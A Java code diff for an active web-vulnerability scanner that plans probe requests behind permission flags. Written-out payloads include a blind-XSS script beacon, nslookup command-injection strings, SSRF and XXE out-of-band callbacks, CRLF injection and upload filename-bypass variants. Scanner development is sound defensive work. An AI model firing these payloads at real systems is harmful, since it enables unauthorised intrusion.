@@ -214,6 +214,135 @@ final class ActiveTestEngine {
         }
     }
 
+    /** Enumerates possible branches without executing a probe or manufacturing a response. */
+    Iterable<NativeRequestStep> plan(HttpRequest base, String probeFilter) {
+        return () -> {
+            List<InsertionPoint> points = InsertionPoint.enumerate(base);
+            java.util.stream.Stream<NativeRequestRecipe> pointPlans = java.util.stream.IntStream.range(0, points.size())
+                    .boxed().flatMap(i -> pointRecipes(base, points.get(i), i == 0).stream());
+            return java.util.stream.Stream.concat(pointPlans, java.util.stream.Stream.of(base).flatMap(request -> requestRecipes(request).stream()))
+                    .filter(recipe -> probeFilter == null || probeFilter.isBlank() || recipe.probe().equals(probeFilter))
+                    .map(NativeRequestRecipe::build).iterator();
+        };
+    }
+
+    private List<NativeRequestRecipe> pointRecipes(HttpRequest base, InsertionPoint point, boolean first) {
+        List<NativeRequestRecipe> recipes = new ArrayList<>();
+        if (first) addPointRecipe(recipes, base, point, WAF_PROBE, "waf", Set.of(), false, false, false, "filter canary");
+        addPointRecipe(recipes, base, point, reflectedXssPayload(point), "reflected-xss", Set.of(), false, false, false, "metacharacter canary");
+        for (int i = 0; i < SSTI_PAYLOADS.size(); i++)
+            addPointRecipe(recipes, base, point, SSTI_PAYLOADS.get(i), "ssti", Set.of(), i > 0, false, false, "arithmetic variant " + (i + 1));
+        addPointRecipe(recipes, base, point, ssrfPayload(PREVIEW_CALLBACK), "ssrf", Set.of(RequestPolicy.Permission.OAST), false, true, false, "callback URL");
+        addPointRecipe(recipes, base, point, blindXssPayload(PREVIEW_CALLBACK), "blind-xss",
+                Set.of(RequestPolicy.Permission.OAST, RequestPolicy.Permission.PERSISTENT_PAYLOAD), false, true, false, "persistent browser beacon");
+        int variant = 0;
+        for (String value : commandPayloads(PREVIEW_CALLBACK))
+            addPointRecipe(recipes, base, point, value, "command-injection", Set.of(RequestPolicy.Permission.OAST), false, true, false, "DNS command variant " + (++variant));
+        addPointRecipe(recipes, base, point, "https://rh-redirect.example.net/", "open-redirect", Set.of(), false, false, false, "redirect marker");
+        addPointRecipe(recipes, base, point, "rhcrlf%0d%0aX-Recon-Hound%3a%20injected", "crlf", Set.of(), false, false, false, "response-header canary");
+        addPointRecipe(recipes, base, point, point.baseValue(), "sqli", Set.of(), false, false, true, "SQL baseline");
+        for (String value : List.of(SQLI_ERROR_PAYLOAD, SQLI_TRUE_PAYLOAD, SQLI_FALSE_PAYLOAD))
+            addPointRecipe(recipes, base, point, value, "sqli", Set.of(), true, false, false, "error/boolean phase");
+        for (int i = 0; i < SQLI_TIMING_SAMPLES; i++)
+            addPointRecipe(recipes, base, point, point.baseValue(), "sqli", Set.of(RequestPolicy.Permission.TIME_DELAY), true, false, true, "timing baseline sample " + (i + 1));
+        variant = 0;
+        for (String value : SQLI_TIME_PAYLOADS) {
+            variant++;
+            for (int i = 0; i < SQLI_TIMING_SAMPLES; i++)
+                addPointRecipe(recipes, base, point, value, "sqli", Set.of(RequestPolicy.Permission.TIME_DELAY), true, false, false, "delay variant " + variant + ", sample " + (i + 1));
+        }
+        addPointRecipe(recipes, base, point, point.baseValue(), "nosqli", Set.of(), false, false, true, "NoSQL baseline");
+        variant = 0;
+        for (String value : NOSQL_PAYLOADS)
+            addPointRecipe(recipes, base, point, value, "nosqli", Set.of(), true, false, false, "NoSQL variant " + (++variant));
+        addPointRecipe(recipes, base, point, point.baseValue(), "path-traversal", Set.of(), false, false, true, "file-read baseline");
+        variant = 0;
+        for (String value : PATH_TRAVERSAL_PAYLOADS)
+            addPointRecipe(recipes, base, point, value, "path-traversal", Set.of(), true, false, false, "file-read variant " + (++variant));
+        Map<String, Object> baselines = new HashMap<>();
+        Object timingPrevious = null;
+        for (int i = 0; i < recipes.size(); i++) {
+            NativeRequestRecipe recipe = recipes.get(i);
+            Object requires = null, establishes = null;
+            if (recipe.mutation() == NativeRequestStep.Mutation.ACTIVE_BASELINE) {
+                establishes = new Object(); baselines.put(recipe.probe(), establishes);
+            } else if (recipe.mutation() == NativeRequestStep.Mutation.TIMING_BASELINE
+                    || recipe.mutation() == NativeRequestStep.Mutation.TIMING_PAYLOAD) {
+                requires = timingPrevious == null ? baselines.get(recipe.probe()) : timingPrevious;
+                establishes = new Object(); timingPrevious = establishes;
+            } else if (recipe.condition() == NativeRequestStep.Condition.RESPONSE_BRANCH) {
+                requires = baselines.get(recipe.probe());
+            }
+            if (requires != null || establishes != null) recipes.set(i, recipe.withConstraints(
+                    new NativeRequestStep.Constraints(null, 0, 1, requires, establishes)));
+        }
+        return recipes;
+    }
+
+    static final String PREVIEW_CALLBACK = "runtime-callback.invalid";
+
+    private static void addPointRecipe(List<NativeRequestRecipe> recipes, HttpRequest base, InsertionPoint point,
+                                       String value, String probe, Set<RequestPolicy.Permission> risks,
+                                       boolean dependent, boolean template, boolean baseline, String detail) {
+        NativeRequestStep.Mutation mutation = baseline ? NativeRequestStep.Mutation.ACTIVE_BASELINE : NativeRequestStep.Mutation.ACTIVE_VALUE;
+        if (risks.contains(RequestPolicy.Permission.TIME_DELAY)) mutation = baseline
+                ? NativeRequestStep.Mutation.TIMING_BASELINE : NativeRequestStep.Mutation.TIMING_PAYLOAD;
+        recipes.add(new NativeRequestRecipe(() -> point.apply(base, value), probe, risks, mutation,
+                dependent ? (probe.equals("ssti") ? NativeRequestStep.Condition.FALLBACK : NativeRequestStep.Condition.RESPONSE_BRANCH) : template ? NativeRequestStep.Condition.RUNTIME_VALUE : NativeRequestStep.Condition.ALWAYS,
+                point.kind() + " " + point.label() + "; " + detail, template));
+    }
+
+    private static List<NativeRequestRecipe> requestRecipes(HttpRequest base) {
+        List<NativeRequestRecipe> recipes = new ArrayList<>();
+        recipes.add(new NativeRequestRecipe(() -> base.withUpdatedHeader("X-Forwarded-Host", PREVIEW_CALLBACK),
+                "host-header", Set.of(RequestPolicy.Permission.OAST), NativeRequestStep.Mutation.HOST_HEADER,
+                NativeRequestStep.Condition.RUNTIME_VALUE, "runtime callback host", true));
+        int variant = 0;
+        for (String origin : craftCorsProbeOrigins(hostOf(base.url()))) {
+            recipes.add(new NativeRequestRecipe(() -> base.withUpdatedHeader("Origin", origin), "cors", Set.of(),
+                    NativeRequestStep.Mutation.CORS_ORIGIN, NativeRequestStep.Condition.ALWAYS, "origin variant " + (++variant), false));
+        }
+        if (looksLikeSensitiveEndpoint(base.url())) for (int i = 0; i < RATE_LIMIT_BURST_SIZE; i++)
+            recipes.add(new NativeRequestRecipe(() -> base, "rate-limit", Set.of(RequestPolicy.Permission.AUTHENTICATION_OR_LOCKOUT),
+                    NativeRequestStep.Mutation.AUTH_BURST, NativeRequestStep.Condition.ALWAYS, "burst request " + (i + 1), false));
+        String contentType = base.headerValue("Content-Type");
+        if (FileUploadEngine.looksLikeMultipartFileUpload(contentType)) {
+            String body = base.bodyToString();
+            for (FileUploadEngine.UploadedFile file : FileUploadEngine.extractUploadedFiles(body, FileUploadEngine.extractBoundary(contentType))) {
+                if (FileUploadEngine.isDangerousExtension(file.filename())) continue;
+                variant = 0;
+                for (String filename : FileUploadEngine.bypassFilenameVariants(file.filename())) {
+                    recipes.add(new NativeRequestRecipe(() -> base.withBody(FileUploadEngine.withRenamedFilename(body, file.filename(), filename)),
+                            "file-upload", Set.of(RequestPolicy.Permission.UPLOAD), NativeRequestStep.Mutation.UPLOAD_FILENAME,
+                            NativeRequestStep.Condition.FALLBACK, "filename variant " + (++variant), false));
+                }
+            }
+        }
+        if (XxeEngine.isXmlBody(contentType, base.bodyToString())) {
+            Object xmlBaseline = new Object();
+            recipes.add(new NativeRequestRecipe(() -> base.withBody(base.bodyToString()), "xxe", Set.of(), NativeRequestStep.Mutation.XML_BASELINE,
+                    NativeRequestStep.Condition.ALWAYS, "XML baseline", false).withConstraints(
+                            new NativeRequestStep.Constraints(null, 0, 1, null, xmlBaseline)));
+            variant = 0;
+            for (String body : XxeEngine.fileReadPayloads())
+                recipes.add(new NativeRequestRecipe(() -> base.withBody(body), "xxe", Set.of(), NativeRequestStep.Mutation.XML_ENTITY,
+                        NativeRequestStep.Condition.RESPONSE_BRANCH, "file entity variant " + (++variant), false).withConstraints(
+                                new NativeRequestStep.Constraints(null, 0, 1, xmlBaseline, null)));
+            recipes.add(new NativeRequestRecipe(() -> base.withBody(XxeEngine.buildOobPayload("http://" + PREVIEW_CALLBACK + "/xxe")),
+                    "xxe", Set.of(RequestPolicy.Permission.OAST), NativeRequestStep.Mutation.XML_ENTITY,
+                    NativeRequestStep.Condition.RESPONSE_BRANCH, "runtime callback entity", true).withConstraints(
+                            new NativeRequestStep.Constraints(null, 0, 1, xmlBaseline, null)));
+        }
+        return recipes;
+    }
+
+    private static String reflectedXssPayload(InsertionPoint point) {
+        return XSS_TOKEN + Integer.toString(point.label().hashCode() & 0xffff, 36) + XSS_PROBE;
+    }
+    private static String ssrfPayload(String host) { return "http://" + host + "/"; }
+    private static String blindXssPayload(String host) { return "\"><script src=//" + host + "></script>"; }
+    private static List<String> commandPayloads(String host) { return List.of(";nslookup " + host + ";", "|nslookup " + host, "$(nslookup " + host + ")"); }
+
     private int testWaf(HttpRequest base, InsertionPoint point, List<ActiveFinding> out) {
         HttpResponse response = sendMutated(base, point, WAF_PROBE);
         if (response == null) return 1;
@@ -226,7 +355,7 @@ final class ActiveTestEngine {
 
     private int testReflectedXss(HttpRequest base, InsertionPoint point, List<ActiveFinding> out) {
         String token = XSS_TOKEN + Integer.toString(point.label().hashCode() & 0xffff, 36);
-        HttpResponse response = sendMutated(base, point, token + XSS_PROBE);
+        HttpResponse response = sendMutated(base, point, reflectedXssPayload(point));
         if (response == null) return 1;
         String surviving = survivingXssChars(response.bodyToString(), token);
         if (!surviving.isEmpty()) {
@@ -260,7 +389,7 @@ final class ActiveTestEngine {
         if (client == null || budgetExhausted()) return 0;
         String correlation = encodeCorrelation("SSRF", point.label(), base.url());
         CollaboratorPayload payload = client.generatePayload(correlation);
-        HttpResponse response = sendMutated(base, point, "http://" + payload + "/");
+        HttpResponse response = sendMutated(base, point, ssrfPayload(payload.toString()));
         if (!Boolean.TRUE.equals(lastRequestDispatched.get())) return 0;
         if (response != null && response.bodyToString().contains(payload.toString())) {
             out.add(new ActiveFinding("HIGH", "SSRF", point.label(),
@@ -277,7 +406,7 @@ final class ActiveTestEngine {
         if (client == null || budgetExhausted()) return 0;
         String correlation = encodeCorrelation("XSS-blind", point.label(), base.url());
         CollaboratorPayload payload = client.generatePayload(correlation);
-        sendMutated(base, point, "\"><script src=//" + payload + "></script>");
+        sendMutated(base, point, blindXssPayload(payload.toString()));
         if (!Boolean.TRUE.equals(lastRequestDispatched.get())) return 0;
         out.add(new ActiveFinding("INFO", "XSS-blind", point.label(),
                 "Blind-XSS beacon sent; awaiting OOB interaction", VerificationState.SIGNAL, base.url()));
@@ -291,9 +420,10 @@ final class ActiveTestEngine {
         CollaboratorPayload payload = client.generatePayload(correlation);
         int before = budgetUsed();
         // Separator variants so at least one survives sh/cmd quoting contexts.
-        sendMutated(base, point, ";nslookup " + payload + ";");
-        if (!budgetExhausted()) sendMutated(base, point, "|nslookup " + payload);
-        if (!budgetExhausted()) sendMutated(base, point, "$(nslookup " + payload + ")");
+        for (String value : commandPayloads(payload.toString())) {
+            if (budgetExhausted()) break;
+            sendMutated(base, point, value);
+        }
         int sent = budgetUsed() - before;
         if (sent > 0) {
             out.add(new ActiveFinding("INFO", "CMDi", point.label(),
@@ -686,13 +816,10 @@ final class ActiveTestEngine {
         Set<RequestPolicy.Permission> probePermissions = currentProbePermissions.get();
         if (probePermissions != null) permissions.addAll(probePermissions);
         if (extraPermissions != null) permissions.addAll(extraPermissions);
-        if (!isSafeMethod(request)) {
-            permissions.add(RequestPolicy.Permission.UNSAFE_HTTP_METHOD);
-            permissions.add(RequestPolicy.Permission.STATE_CHANGING);
-        }
+        Set<RequestPolicy.Permission> required = NativeRequestRecipe.mutationPermissions(request, permissions);
 
         ActiveRequestGateway.Result result = gateway.send(run,
-                RequestPlan.create(request, currentProbeId.get(), permissions),
+                RequestPlan.create(request, currentProbeId.get(), required),
                 request);
         if (result.error() != null) {
             api.logging().logToError("Active request failed for " + request.url(), result.error());
